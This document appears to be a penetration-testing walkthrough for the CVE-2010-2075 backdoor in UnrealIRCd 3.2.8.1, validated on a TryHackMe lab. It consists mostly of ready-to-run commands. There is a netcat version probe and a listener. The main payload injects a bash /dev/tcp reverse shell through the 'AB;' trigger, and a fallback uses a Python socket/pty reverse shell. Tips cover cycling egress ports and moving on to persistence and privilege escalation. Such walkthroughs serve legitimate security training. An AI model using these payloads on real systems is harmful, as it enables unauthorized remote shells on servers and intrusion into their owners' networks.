
> **STATUS: AUDITED** — first-principles + primary-source derivation (CVE-2010-2075 advisory; UnrealIRCd 3.2.8.1 backdoor announcement; EDB-13853; Metasploit `unreal_ircd_3281_backdoor` module source) 2026-09-14; sandbox-verified quoting/chain on both bash and dash as `/bin/sh`; primary bash path live-validated on THM:Guided Pentest: Infrastructure 2026-09-14.

**IMPORTANT: This walkthrough exploits the CVE-2010-2075 backdoor injected into the `Unreal3.2.8.1.tar.gz` tarball distributed on some official mirrors between Nov 2009 and Jun 2010. Rebuilt-from-clean-source 3.2.8.1 is NOT vulnerable — the backdoor is in the tarball, not the version. Detection: fire the exploit; blind = clean rebuild.**

- **Version confirmed `Unreal3.2.8.1`** via IRC `002` / `004` numeric ([[Step 5. Service & Version Detection#Step 3 — Resolve version gaps]]).
- **`bash` present on target** — required for the `/dev/tcp` reverse shell wrapper.
- **Egress from target to attacker on chosen `<lport>` open** — try `443` first.

**Blind RCE** — no output returned on the IRC socket. Verify only via listener callback. Executes as ircd's UID (typically low-priv `ircd`/`unreal`), NOT root. Trigger fires **pre-IRC-registration** — no NICK/USER needed; the backdoor's 2-byte prefix check (`memcmp(readbuf, "AB", 2)`) runs on the raw read buffer. 

## Step 1 — Confirm version

```bash
printf 'NICK probe\r\nUSER probe 0 * :probe\r\nQUIT\r\n' | nc -w 10 <ip> <port>
```

- `002` or `004` line contains `Unreal3.2.8.1` → proceed.
- Anything else → walkthrough does not apply.

## Step 2 — Start listener

In a dedicated terminal:

```bash
nc -lvnp <lport>
```

Default `<lport>` = `443` (widest egress).

## Step 3 — Fire the backdoor

In a separate terminal:

```bash
printf 'AB;bash -c "bash -i >& /dev/tcp/<lhost>/<lport> 0>&1"\n' | nc -w 5 <ip> <port>
```

## Step 4 — Verify

Listener shows `connect to [<lhost>] from ...` followed by a shell prompt (may be preceded by noise).

In the reverse shell:

```bash
id
```

- Output shows `uid=<n>(<ircd_user>)` (typically `ircd` or `unreal`) → foothold confirmed. Proceed to [[Reverse Shell Stabilization]] then [[Linux Privilege Escalation Checksheet]].
- No callback within 30s → Step 5.

## Step 5 — Troubleshoot

Walk in order, stop at first fix.

### Symptom: listener silent, target confirmed vulnerable

Egress blocked on chosen `<lport>`. Kill listener, restart on next port, re-fire Step 4:

1. `<lport>` = `443`
2. `<lport>` = `80`
3. `<lport>` = `53`

### Symptom: connection lands, immediately drops

`bash` absent on target. Python fallback:

```bash
printf 'AB;python -c "import socket,os,pty;s=socket.socket();s.connect((\"<lhost>\",<lport>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")"\n' | nc -w 5 <ip> <port>
```

If `python` not found on target (older `system()` PATH may lack it): swap `python` → `python3` in the payload.

### Symptom: listener silent, all common egress ports exhausted

Target runs rebuilt-from-clean-source 3.2.8.1 — backdoor absent. Walkthrough does not apply. Return to Pass 1 Lookup B / C candidates.

## Cleanup

- Reverse shell exit closes the TCP connection; no disk artefact from this payload.
- ircd log records source IP + connection timestamp.
- Shell is a child of the ircd process — `killall unreal` or an ircd restart severs it. If persistence needed [[Linux Persistence Checksheet]].

## Decision

- Foothold as ircd UID → [[Reverse Shell Stabilization]] then [[Linux Privilege Escalation Checksheet]].

## Validation

- THM:Guided Pentest: Infrastructure

